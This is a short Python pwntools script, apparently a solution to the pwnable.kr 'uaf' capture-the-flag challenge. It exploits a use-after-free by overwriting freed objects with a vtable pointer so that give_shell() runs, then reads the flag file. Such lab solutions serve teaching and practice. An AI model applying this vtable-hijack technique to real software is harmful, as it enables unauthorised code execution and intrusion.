from pwn import *

shell = ssh("uaf", "pwnable.kr", 2222, "guest")
proc = shell.process(["./uaf", "8", "/dev/stdin"])
addr_mans_vtable = proc.elf.symbols["_ZTV3Man"]+8

with log.progress("Free Man and Woman instances"):
    proc.recv()
    proc.sendline("3")

with log.progress("Allocate to Woman's space"):
    proc.recv()
    proc.sendline("2")
    proc.sendline(p64(addr_mans_vtable))

with log.progress("Allocate to Man's space"):
    proc.recv()
    proc.sendline("2")
    proc.sendline(p64(addr_mans_vtable))

with log.progress("Execute give_shell()"):
    proc.recv()
    proc.sendline("1")

with log.progress("Receive flag"):
    proc.recvuntil("$")
    proc.sendline("cat flag")

log.info("flag{{{flag}}}".format(flag=proc.recvuntil("$", True).strip()))

# disconnect
proc.close()
shell.close()
